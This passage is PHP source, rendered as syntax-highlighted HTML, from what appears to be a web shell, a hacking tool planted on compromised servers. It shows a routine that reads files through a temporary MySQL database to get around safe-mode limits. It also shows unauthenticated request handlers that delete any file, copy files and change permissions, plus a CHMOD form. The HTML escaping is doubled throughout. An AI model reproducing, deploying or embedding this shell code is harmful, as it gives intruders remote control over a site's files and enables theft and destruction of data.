<span class="k">foreach</span> <span class="p">(</span><span class="nv">$line</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$col_value</span><span class="p">)</span> <span class="p">{</span>
<span class="k">print</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$col_value</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}}</span>
<span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
<span class="nb">mysql_drop_db</span><span class="p">(</span><span class="s2">&quot;tmp_bd_file&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&amp;lt;font color=red&amp;gt;&quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/font&amp;gt;&quot;</span><span class="p">);</span>
<span class="p">}</span>


<span class="k">print</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="k">die</span><span class="p">;</span>
<span class="p">}</span><span class="c1">#end of read_file_safe_mode</span>


<span class="c1"># sys</span>
<span class="nv">$wich_f</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;wich_f&#39;</span><span class="p">];</span>
<span class="nv">$delete</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;delete&#39;</span><span class="p">];</span>
<span class="nv">$del_f</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;del_f&#39;</span><span class="p">];</span>
<span class="nv">$chmod</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;chmod&#39;</span><span class="p">];</span>
<span class="nv">$ccopy_to</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ccopy_to&#39;</span><span class="p">];</span>


<span class="c1"># delete</span>
<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;del_f&#39;</span><span class="p">]){</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$delete</span><span class="p">)){</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;font color=red&amp;gt;Delete this file?&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;b&amp;gt;</span><span class="si">$d</span><span class="s2">/</span><span class="si">$wich_f</span><span class="s2">&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;/b&amp;gt;</span>
<span class="s2">&amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;del_f=</span><span class="si">$wich_f</span><span class="s2">&amp;delete=1&#39;&amp;gt;Yes&amp;lt;/a&amp;gt; / &amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&#39;&amp;gt;No&amp;lt;/a&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;}</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$delete</span><span class="o">==</span><span class="mi">1</span><span class="p">){</span>
<span class="nb">unlink</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$del_f</span><span class="p">);</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;b&amp;gt;File: &amp;lt;font color=green&amp;gt;</span><span class="si">$d</span><span class="s2">/</span><span class="si">$del_f</span><span class="s2"> DELETED!&amp;lt;/font&amp;gt;&amp;lt;/b&amp;gt;</span>
<span class="s2">&amp;lt;br&amp;gt;&amp;lt;b&amp;gt; &amp;lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&#39;&amp;gt;# BACK&amp;lt;/a&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">echo</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>


<span class="c1"># copy to</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$ccopy_to</span><span class="p">){</span>
<span class="nv">$wich_f</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;wich_f&#39;</span><span class="p">];</span>
<span class="nv">$to_f</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;to_f&#39;</span><span class="p">];</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;font color=green&amp;gt;Copy file:&amp;lt;br&amp;gt;</span>
<span class="si">$d</span><span class="s2">/</span><span class="si">$ccopy_to</span><span class="s2">&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;form method=post&amp;gt;</span>
<span class="s2">File:&amp;lt;br&amp;gt;&amp;lt;input name=wich_f size=100 value=&#39;</span><span class="si">$d</span><span class="s2">/</span><span class="si">$ccopy_to</span><span class="s2">&#39;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">To:&amp;lt;br&amp;gt;&amp;lt;input name=to_f size=100 value=&#39;</span><span class="si">$d</span><span class="s2">/nst_</span><span class="si">$ccopy_to</span><span class="s2">&#39;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;input type=submit value=Copy&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$to_f</span><span class="p">){</span>
<span class="o">@</span><span class="nb">copy</span><span class="p">(</span><span class="nv">$wich_f</span><span class="p">,</span><span class="nv">$to_f</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&amp;lt;font color=red&amp;gt;Cannot copy!!! maybe folder is not writable&amp;lt;/font&amp;gt;&quot;</span><span class="p">);</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;font color=green&amp;gt;&amp;lt;b&amp;gt;Copy success!!!&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">echo</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>


<span class="c1"># chmod</span>
<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;chmod&#39;</span><span class="p">]){</span>
<span class="nv">$perms</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$wich_f</span><span class="p">);</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&amp;lt;font color=green&amp;gt;CHMOD file </span><span class="si">$d</span><span class="s2">/</span><span class="si">$wich_f</span><span class="s2">&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">&amp;lt;br&amp;gt;&amp;lt;center&amp;gt;This file chmod is&amp;lt;/b&amp;gt; &quot;</span><span class="p">;</span>
<span class="k">print</span> <span class="nx">perm</span><span class="p">(</span><span class="nv">$perms</span><span class="p">);</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;/center&amp;gt;</span>
<span class="s2">&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="nv">$chmd</span><span class="o">=&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">HTML</span>

<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">script</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">!--</span>

<span class="k">function</span> <span class="nf">do_chmod</span><span class="p">(</span><span class="nx">user</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">var</span> <span class="nx">field4</span> <span class="o">=</span> <span class="nx">user</span> <span class="o">+</span> <span class="s2">&quot;4&quot;</span><span class="p">;</span>
        <span class="k">var</span> <span class="nx">field2</span> <span class="o">=</span> <span class="nx">user</span> <span class="o">+</span> <span class="s2">&quot;2&quot;</span><span class="p">;</span>
        <span class="k">var</span> <span class="nx">field1</span> <span class="o">=</span> <span class="nx">user</span> <span class="o">+</span> <span class="s2">&quot;1&quot;</span><span class="p">;</span>
        <span class="k">var</span> <span class="nx">total</span> <span class="o">=</span> <span class="s2">&quot;t_&quot;</span> <span class="o">+</span> <span class="nx">user</span><span class="p">;</span>
        <span class="k">var</span> <span class="nx">symbolic</span> <span class="o">=</span> <span class="s2">&quot;sym_&quot;</span> <span class="o">+</span> <span class="nx">user</span><span class="p">;</span>
        <span class="k">var</span> <span class="nx">number</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">var</span> <span class="nx">sym_string</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="p">[</span><span class="nx">field4</span><span class="p">]</span><span class="o">.</span><span class="nx">checked</span> <span class="o">==</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span> <span class="nx">number</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">;</span> <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="p">[</span><span class="nx">field2</span><span class="p">]</span><span class="o">.</span><span class="nx">checked</span> <span class="o">==</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span> <span class="nx">number</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span> <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="p">[</span><span class="nx">field1</span><span class="p">]</span><span class="o">.</span><span class="nx">checked</span> <span class="o">==</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span> <span class="nx">number</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="p">[</span><span class="nx">field4</span><span class="p">]</span><span class="o">.</span><span class="nx">checked</span> <span class="o">==</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">sym_string</span> <span class="o">+=</span> <span class="s2">&quot;r&quot;</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nx">sym_string</span> <span class="o">+=</span> <span class="s2">&quot;-&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="p">[</span><span class="nx">field2</span><span class="p">]</span><span class="o">.</span><span class="nx">checked</span> <span class="o">==</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">sym_string</span> <span class="o">+=</span> <span class="s2">&quot;w&quot;</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nx">sym_string</span> <span class="o">+=</span> <span class="s2">&quot;-&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="p">[</span><span class="nx">field1</span><span class="p">]</span><span class="o">.</span><span class="nx">checked</span> <span class="o">==</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">sym_string</span> <span class="o">+=</span> <span class="s2">&quot;x&quot;</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nx">sym_string</span> <span class="o">+=</span> <span class="s2">&quot;-&quot;</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="nx">number</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="nx">number</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
        <span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="p">[</span><span class="nx">total</span><span class="p">]</span><span class="o">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">number</span><span class="p">;</span>
        <span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="p">[</span><span class="nx">symbolic</span><span class="p">]</span><span class="o">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">sym_string</span><span class="p">;</span>

        <span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="o">.</span><span class="nx">t_total</span><span class="o">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="o">.</span><span class="nx">t_owner</span><span class="o">.</span><span class="nx">value</span> <span class="o">+</span> <span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="o">.</span><span class="nx">t_group</span><span class="o">.</span><span class="nx">value</span> <span class="o">+</span> <span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="o">.</span><span class="nx">t_other</span><span class="o">.</span><span class="nx">value</span><span class="p">;</span>
        <span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="o">.</span><span class="nx">sym_total</span><span class="o">.</span><span class="nx">value</span> <span class="o">=</span> <span class="s2">&quot;-&quot;</span> <span class="o">+</span> <span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="o">.</span><span class="nx">sym_owner</span><span class="o">.</span><span class="nx">value</span> <span class="o">+</span> <span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="o">.</span><span class="nx">sym_group</span><span class="o">.</span><span class="nx">value</span> <span class="o">+</span> <span class="nx">document</span><span class="o">.</span><span class="nb">chmod</span><span class="o">.</span><span class="nx">sym_other</span><span class="o">.</span><span class="nx">value</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">//--&amp;gt;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">script</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>



<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">form</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;chmod&quot;</span> <span class="nx">method</span><span class="o">=</span><span class="nx">post</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">p</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">table</span> <span class="nx">cellpadding</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nx">cellspacing</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nx">border</span><span class="o">=</span><span class="s2">&quot;0&quot;</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;silver&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">width</span><span class="o">=</span><span class="s2">&quot;100%&quot;</span> <span class="nx">valign</span><span class="o">=</span><span class="s2">&quot;top&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">table</span> <span class="nx">width</span><span class="o">=</span><span class="s2">&quot;100%&quot;</span> <span class="nx">cellpadding</span><span class="o">=</span><span class="s2">&quot;5&quot;</span> <span class="nx">cellspacing</span><span class="o">=</span><span class="s2">&quot;2&quot;</span> <span class="nx">border</span><span class="o">=</span><span class="s2">&quot;0&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">width</span><span class="o">=</span><span class="s2">&quot;100%&quot;</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#008000&quot;</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span> <span class="nx">colspan</span><span class="o">=</span><span class="s2">&quot;5&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">font</span> <span class="nx">color</span><span class="o">=</span><span class="s2">&quot;#ffffff&quot;</span> <span class="nx">size</span><span class="o">=</span><span class="s2">&quot;3&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">CHMOD</span> <span class="p">(</span><span class="nx">File</span> <span class="nx">Permissions</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">font</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
        <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">tr</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;gray&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;left&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Permission</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Owner</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Group</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Other</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#dddddd&quot;</span> <span class="nx">rowspan</span><span class="o">=</span><span class="s2">&quot;4&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
        <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">tr</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#dddddd&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;left&quot;</span> <span class="nx">nowrap</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Read</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#ffffff&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;checkbox&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;owner4&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;4&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&quot;do_chmod(&#39;owner&#39;)&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#ffffff&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;checkbox&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;group4&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;4&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&quot;do_chmod(&#39;group&#39;)&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#ffffff&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;checkbox&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;other4&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;4&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&quot;do_chmod(&#39;other&#39;)&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
        <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">tr</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#dddddd&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;left&quot;</span> <span class="nx">nowrap</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Write</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#ffffff&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;checkbox&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;owner2&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;2&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&quot;do_chmod(&#39;owner&#39;)&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
                <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span> <span class="nx">align</span><span class="o">=</span><span class="s2">&quot;center&quot;</span> <span class="nx">bgcolor</span><span class="o">=</span><span class="s2">&quot;#ffffff&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;checkbox&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;group2&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;2&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&quot;do_chmod(&#39;group&#39;)&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
